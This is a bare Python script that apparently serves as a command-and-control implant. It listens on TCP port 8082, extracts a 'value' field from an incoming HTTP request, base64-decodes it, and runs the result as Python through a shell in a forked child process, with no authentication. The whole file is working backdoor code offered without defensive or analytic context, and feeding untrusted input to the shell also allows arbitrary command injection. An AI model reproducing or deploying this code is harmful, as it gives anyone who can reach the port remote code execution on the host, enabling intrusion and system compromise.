import socket
import urllib.parse
from base64 import b64decode
import subprocess
import os

HOST = ''
PORT = 8082

def accept_connection():
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.bind((HOST, PORT))
    sock.listen(1)

    conn, addr = sock.accept()

    data = b''
    while True:
        data_in = conn.recv(1024)
        data += data_in
        if len(data_in) < 1024:
            break
    sock.close()

    return data


def parse_cnc(data):
    data = data.decode('utf-8')
    data = data.split('\r\n\r\n')
    data = data[1].split('&')
    for d in data:
        if 'value' in d:
            d = d.split('=', 1)
            return urllib.parse.unquote(d[1])


def execute_cnc(implant):
    command = "echo " + implant + " | base64 -d | xargs python3 -c"
    pid = os.fork()
    if pid == 0:
        subprocess.Popen(command, shell=True)


data = accept_connection()
cnc = parse_cnc(data)
execute_cnc(cnc)